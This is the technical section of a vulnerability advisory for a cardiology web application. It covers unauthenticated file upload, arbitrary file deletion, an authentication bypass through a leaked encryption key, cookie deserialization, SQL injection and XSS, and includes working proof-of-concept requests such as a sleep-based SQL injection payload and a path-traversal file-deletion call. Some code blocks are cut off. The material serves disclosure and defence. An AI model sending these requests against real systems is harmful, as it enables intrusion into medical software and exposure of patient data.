## Technical Details


### Improper Session Validation

Session authorization is enforced by PHP include() call to `/library/sessionValid.php`. This code validates that a server-side session is active and that variables within that session are adequately set. When a session is not valid, a snippet of JavaScript is included in the HTTP response with the desired effect of redirecting the user to the login page; however, there is no logic to stop the application logic from continuing to execute. As a result, it is possible for an attacker to execute application logic that uses this include for  authorization, including `/library/run_class.php`, which can be used to require a file, instantiate a class, and execute a function within that class without proper authorization. This can be used to delete files, get directory listings, and execute other logic present in the application.

Request:
```

### Unauthenticated File Upload / Unvalidated File Upload

Code in the file `/upload/upload_save.php` is used to upload files to the server. This path does not require authentication. Additionally, files are not validated for content and can be saved with an arbitrary extension. A session variable is used to build a directory path when saving files, if a session has not been initiated, this upload path results in files being saved in a child of `/upload`. As a result, it is possible for an attacker to upload and execute PHP. If a session is initiated, files are saved into a directory that is not directly accessible by the webserver, however, other issues present in the application make it possible to execute this code.

Upload file:
```
POST /upload/upload_save.php HTTP/1.1
Host: example.com
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate

### Unauthenticated Arbitrary File Deletion

The `pdfname` class function `deleteNew` in `/library/class_pdfname.php` does not validate a request variable prior to passing it to the `unlink` function. Allowing an attacker to delete arbitrary files from the underlying file system. It is possible to call this class function using `/library/run_class.php`, which does not require authentication, and uses request variables to require a file, instantiate a class, and call a function on that class object.

Request:
```
GET /library/run_class.php?class=pdfname&page=&action=deleteNew&path=../upload/mods/ecg/raw_ecg-hp_xml/lugqmrbmhxun.php HTTP/1.1
Host: example.com

### Unauthenticated Encryption Key Disclosure / Static/Global Encryption Key / Authentication Bypass / Use of Unauthenticated Encryption

The path `/webapi/testFormEncrypt.php` requires that the request come from `localhost` and renders a form, that when submitted, is sent to `/webapi/testResults.php`, which itself does not enforce the same `localhost` check or any other form of authentication. Logic in these pages uses encryption to generate a string of ciphertext containing an arbitrary username and timestamp. This string can then be used to login to the application. For convience, `testResults.php` renders two links, that when clicked, will send the ciphertext string to `/webapi/webTrust.php` or `/webapi/webTrust2.php`, either of which will decrypt the provided ciphertext and create a valid session as the provided user. As a result, an attacker with knowledge of the logic in `testResults.php` can send a request and login to the application as an arbitrary user.

Request:
```
GET /webapi/testResults.php?username=admin&studyid=1&patid=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0

        <td align="center"><a class="button_std" href="../webapi/webTrust2.php?wt_username=XXXXXXXXXXXXXXXXXXXXC8&patid=1&debug=true">&nbsp;&nbsp;Epic Log-in&nbsp;&nbsp;</a></td>
    </tr>

```

Additionally, `testResults.php` discloses the encryption key in the response body. This key appears to be shared across installations. As a result, even if the authentication issues are resolved, it could be possible for an attacker with knowledge of this key to compromise multiple installs.

Finally, there are several issues present in the encryption scheme, which uses the 3DES algorithm operating in CBC mode, including a static IV and the user supplied ciphertext is not properly validated using an authentication mechanism such an HMAC prior to attempting decryption.


### Unauthenticated PHP Object Deserialization

The cookie `cs_persist` is a PHP object generated and parsed using `serialize` and `unserialize` respectively. An attacker can change the data in this cookie to affect data within the session and application, including the username. While this issue can lead to code execution, a gadget chain was not identified.

Cookie:
```
cs_persist=a%3A11%3A%7Bs%3A11%3A%22idc_systype%22%3Bs%3A1%3A%221%22%3Bs%3A4%3A%22name%22%3Bs%3A12%3A%22cardioserver%22%3Bs%3A6%3A%22image1%22%3Bs%3A16%3A%22cardioserver.gif%22%3Bs%3A6%3A%22image2%22%3Bs%3A14%3A%22epiphanyhd.png%22%3Bs%3A6%3A%22image3%22%3BN%3Bs%3A3%3A%22css%22%3Bs%3A6%3A%22cs.css%22%3Bs%3A5%3A%22name2%22%3Bs%3A13%3A%22Cardio+Server%22%3Bs%3A8%3A%22trans_id%22%3BN%3Bs%3A13%3A%22user_language%22%3Bs%3A7%3A%22english%22%3Bs%3A12%3A%22display_type%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22cmUser%22%3Bs%3A5%3A%22admin%22%3B%7D
```

```


### Systemic SQL Injection

The application passes request variables directly into SQL strings throughout the codebase, resuling in SQL Injection. Areas where application logic does not expect the user to be authenticated, such as login forms, uses parameterized queries, however; areas where the user is expected to be authenticated do not. Due to broken session validation, it is possible for an unauthenticated user to reach vulnerable code and leverage these issues.

The following request demonstrates this issue. Note, SQL Injection is systemic throughout the application and this represents only a single instance.

Request:
```
GET /library/run_class.php?action=studyInbox&class=inbox&next=0&skip=&skipping=&smsort1=timestamp_performed&smsortorder1=ASC%2c(select*from(select(sleep(20)))a)&archive=&smfield^study_site_code[]=All&smfield^study_mod_type[]=All&smfield^study_status_confirmed[]=Confirmed&smfield^date_performed[]=All&smfield^inbox_find_field[]=pat_name_last&smfield^study_find[]=aaa&findNum=15 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```

This request will cause a time delay that is comparable to the time provided in the request (approximately 20 seconds).


### Systemic Cross-Site Scripting

There are many instances where user-supplied data is rendered in a response without being sanitized using a context-aware encoding scheme.

The following request demonstrates this issue. Note, Cross-Site Scripting is systemic throughout the application and this represents only a single instance.

Request:
```
GET /library/run_class.php?action=studyInbox&class=inbox&next=0&skip=&skipping=&smsort1=timestamp_performed&smsortorder1=ASC&archive=&smfield^study_site_code[]=All&smfield^study_mod_type[]=All&smfield^study_status_confirmed[]=Confirmed&smfield^date_performed[]=All&smfield^inbox_find_field[]=pat_name_last&smfield^study_find[]=%3cscript%3ealert(1)%3c%2fscript%3e&findNum=15 HTTP/1.1
